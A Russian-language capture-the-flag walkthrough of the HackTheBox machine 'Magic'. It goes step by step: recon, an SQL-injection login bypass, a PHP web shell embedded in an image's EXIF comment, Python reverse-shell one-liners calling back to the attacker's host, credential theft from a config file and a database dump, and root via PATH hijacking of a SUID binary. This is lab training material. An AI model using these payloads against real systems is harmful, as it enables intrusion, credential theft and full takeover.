# Magic
## HTB machine

- Название: Magic
- OS: Linux
- Ресурс: HackTheBox
- Сложность: Easy
- Дата релиза: 18.04.20

## Write-up

```html
┌─[root@parrot]─[/home/user/Downloads]
└──╼ #nmap -sC -sV 10.10.10.185
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-30 08:10 CDT
Nmap scan report for 10.10.10.185
Host is up (0.095s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.97 seconds
```

> Проверим директории:

```html
┌─[✗]─[root@parrot]─[/home/user/Downloads]
└──╼ #dirb http://10.10.10.185/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Jun 30 08:14:15 2020
URL_BASE: http://10.10.10.185/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.185/ ----
==> DIRECTORY: http://10.10.10.185/assets/                                        
==> DIRECTORY: http://10.10.10.185/images/                                        
+ http://10.10.10.185/index.php (CODE:200|SIZE:4191)                              
+ http://10.10.10.185/server-status (CODE:403|SIZE:277)                           
                                                                                  
---- Entering directory: http://10.10.10.185/assets/ ----
==> DIRECTORY: http://10.10.10.185/assets/css/                                    
==> DIRECTORY: http://10.10.10.185/assets/js/                                     
                                                                                  
---- Entering directory: http://10.10.10.185/images/ ----
==> DIRECTORY: http://10.10.10.185/images/uploads/                                
                                                                                  
---- Entering directory: http://10.10.10.185/assets/css/ ----
==> DIRECTORY: http://10.10.10.185/assets/css/images/                             
                                                                                  
---- Entering directory: http://10.10.10.185/assets/js/ ----
                                                                                  
---- Entering directory: http://10.10.10.185/images/uploads/ ----
                                                                                  
---- Entering directory: http://10.10.10.185/assets/css/images/ ----
==> DIRECTORY: http://10.10.10.185/assets/css/images/ie/                          
                                                                                  
---- Entering directory: http://10.10.10.185/assets/css/images/ie/ ----
                                                                                  
-----------------
END_TIME: Tue Jun 30 09:37:51 2020
DOWNLOADED: 36896 - FOUND: 2

┌─[root@parrot]─[/home/user/Downloads]
└──╼ #wfuzz -u http://10.10.10.185/FUZZ.php -w /usr/share/wfuzz/wordlist/general/big.txt --sc 200

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.185/FUZZ.php
Total requests: 3024

===================================================================
ID           Response   Lines    Word     Chars       Payload           
===================================================================

000001350:   200        59 L     221 W    4346 Ch     "index"           
000001627:   200        117 L    277 W    4221 Ch     "login"           

Total time: 38.01530
Processed Requests: 3024
Filtered Requests: 3022
Requests/sec.: 79.54691<
```

>Перехватим страницу login.php с помощью burp, вводим рандомные значения в поля логина, пароля и жмем Login:
>Во вкладке Proxy -> Intercept видим результат, внизу строка, типа:

```html
username=user&password=pass
```

>После некоторых манипуляций, удалось обойти авторизацию, с помощью:

```html
username=admin' or 1=1 --&password=password
```

>Или еще проще - просто в полях логина и пароля вбить значения " ' or 1=1 -- "
>Нас выкидывает на upload.php, где предлагают загрузить изображение и для дальнейших действий нам нужен exiftool, берем любое изображение:

```html
exiftool -Comment='?php system($_REQUEST['cmd']); ?' 1.png
```

>После, переименовываем 1.png в 1.php.png и загружаем. Если в левом верхнем углу страницы upload.php появилась надпись "The file 1.php.png has been uploaded", значит все прошло успешно.

>Далее, чтобы получить обратную оболочку, необходимо выполнить следующий код на стороне сервера, с помощью загруженного изображения:

```html 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ЗДЕСЬ ТВОЙ IP(tun0)",ЗДЕСЬ ТВОЙ ПОРТ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

>Не забываем самое важное:

```html
┌─[root@parrot]─[/home/user/Downloads]
└──╼ #nc -nlvp ТВОЙ ПОРТ
listening on [any] ТВОЙ ПОРТ ...
```

>И обращаемся по адресу:

```html
http://10.10.10.185/images/uploads/test.php.png?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ЗДЕСЬ ТВОЙ IP(tun0)",ЗДЕСЬ ТВОЙ ПОРТ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

>Должно выйти подобное:

```html
┌─[root@parrot]─[/home/user/Downloads]
└──╼ #nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.15.18] from (UNKNOWN) [10.10.10.185] 60408
/bin/sh: 0: can't access tty; job control turned off
$ ls
1.php.png
7.jpg
giphy.gif
logo.png
magic-1424x900.jpg
magic-hat_23-2147512156.jpg
magic-wand.jpg
trx.jpg
```

>Спавн оболочки:

```html
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@ubuntu:/var/www/Magic/assets/sass$ ls
ls
libs  main.scss  noscript.scss
```

>В каталоге /var/www/Magic/:

```html
www-data@ubuntu:/var/www/Magic$ cat db.php5
?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = '<mark>theseus</mark>';
    private static $dbUserPassword = '<mark>iamkingtheseus</mark>';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}
```

>Просмотрим базу данных с помощью полученных кредов:

```html
www-data@ubuntu:/var/www/Magic$ mysqldump --databases Magic -utheseus -piamkingtheseus    
qldump --databases Magic -utheseus -piamkingtheseus
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version	5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Current Database: `Magic`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `Magic` /*!40100 DEFAULT CHARACTER SET latin1 */;

USE `Magic`;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2020-06-30 13:56:45
```

>Логинимся как theseus:

```html
www-data@ubuntu:/var/www/Magic/images/uploads$ su theseus
su theseus
Password: Th3s3usW4sK1ng
```

>И берем первый флаг:

```html
theseus@ubuntu:~$ cat user.txt
cat user.txt
f26dbdc470eb7b8d553d22**********
```

>Переходим к получению root:

```html
theseus@ubuntu:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/arping
/usr/bin/vmware-user-suid-wrapper
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/snap/core18/1223/bin/mount
/snap/core18/1223/bin/ping
/snap/core18/1223/bin/su
/snap/core18/1223/bin/umount
/snap/core18/1223/usr/bin/chfn
/snap/core18/1223/usr/bin/chsh
/snap/core18/1223/usr/bin/gpasswd
/snap/core18/1223/usr/bin/newgrp
/snap/core18/1223/usr/bin/passwd
/snap/core18/1223/usr/bin/sudo
/snap/core18/1223/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1223/usr/lib/openssh/ssh-keysign
/snap/core18/1668/bin/mount
/snap/core18/1668/bin/ping
/snap/core18/1668/bin/su
/snap/core18/1668/bin/umount
/snap/core18/1668/usr/bin/chfn
/snap/core18/1668/usr/bin/chsh
/snap/core18/1668/usr/bin/gpasswd
/snap/core18/1668/usr/bin/newgrp
/snap/core18/1668/usr/bin/passwd
/snap/core18/1668/usr/bin/sudo
/snap/core18/1668/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1668/usr/lib/openssh/ssh-keysign
/snap/core/8689/bin/mount
/snap/core/8689/bin/ping
/snap/core/8689/bin/ping6
/snap/core/8689/bin/su
/snap/core/8689/bin/umount
/snap/core/8689/usr/bin/chfn
/snap/core/8689/usr/bin/chsh
/snap/core/8689/usr/bin/gpasswd
/snap/core/8689/usr/bin/newgrp
/snap/core/8689/usr/bin/passwd
/snap/core/8689/usr/bin/sudo
/snap/core/8689/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8689/usr/lib/openssh/ssh-keysign
/snap/core/8689/usr/lib/snapd/snap-confine
/snap/core/8689/usr/sbin/pppd
/snap/core/7917/bin/mount
/snap/core/7917/bin/ping
/snap/core/7917/bin/ping6
/snap/core/7917/bin/su
/snap/core/7917/bin/umount
/snap/core/7917/usr/bin/chfn
/snap/core/7917/usr/bin/chsh
/snap/core/7917/usr/bin/gpasswd
/snap/core/7917/usr/bin/newgrp
/snap/core/7917/usr/bin/passwd
/snap/core/7917/usr/bin/sudo
/snap/core/7917/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7917/usr/lib/openssh/ssh-keysign
/snap/core/7917/usr/lib/snapd/snap-confine
/snap/core/7917/usr/sbin/pppd
/bin/umount
/bin/fusermount
/bin/sysinfo
/bin/mount
/bin/su
/bin/ping
```

>На своей машине создаем файл с содержимым:

```html
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ТВОЙ IP(tun0)",ТВОЙ ПОРТ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

>Загружаем файл:

```html
theseus@ubuntu://tmp/fuck$ wget http://10.10.15.51:8000/lshw
wget http://10.10.15.51:8000/lshw
--2020-07-01 07:57:26--  http://10.10.15.51:8000/lshw
Connecting to 10.10.15.51:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 229 [application/octet-stream]
Saving to: ‘lshw’

lshw                100%[===================>]     229  --.-KB/s    in 0s      

2020-07-01 07:57:26 (35.9 MB/s) - ‘lshw’ saved [229/229]
```

>Добавим каталог в переменную среды и сделаем файл исполняемым:

```html
theseus@ubuntu://tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
theseus@ubuntu://tmp$ chmod 755 lshw 
chmod 755 lshw
```

>Заранее включаем netcat:

```html
┌─[✗]─[root@parrot]─[/home/user/Downloads]
└──╼ #nc -nlvp 4444
listening on [any] 4444 ...
```

>И запустим sysinfo, у меня получить root таким образом вышло раза с пятого:

```html
theseus@ubuntu://tmp$ sysinfo
```

>Ждем некоторое время:

```html
┌─[✗]─[root@parrot]─[/home/user/Downloads]
└──╼ #nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.15.51] from (UNKNOWN) [10.10.10.185] 36652
# id
uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
# python3 -c "import pty;pty.spawn('/bin/bash')"
```

>И берем флаг:

```html
root@ubuntu://root# cat root.txt
cat root.txt
34aee7824bdd4da0bc4dfc**********
```




